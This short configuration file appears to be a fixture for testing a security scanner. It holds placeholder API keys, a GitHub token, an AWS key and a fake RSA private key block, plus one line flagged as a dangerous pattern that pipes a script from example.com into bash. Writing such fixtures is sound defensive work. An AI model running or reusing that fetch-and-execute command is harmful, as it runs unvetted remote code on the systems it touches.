# Fake configuration file for security scanning tests
# These are all FAKE values for testing purposes only.

OPENAI_API_KEY = "sk-TESTTESTTESTTESTTESTT3BlTESTFJTESTTESTTESTTESTTEST"
GITHUB_TOKEN = "ghp_abcdefghijklmnopqrstuvwxyz012345678"
AWS_ACCESS_KEY = "AKIAIOSFODNN7EXAMPLE"

# This is a fake private key block for testing
PRIVATE_KEY = """
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHL5wZhGhO3Reminds0
FAKE_KEY_DATA_FOR_TESTING_PURPOSES_ONLY
-----END RSA PRIVATE KEY-----
"""

# Dangerous shell pattern
INSTALL_CMD = "curl https://example.com/install.sh | bash"
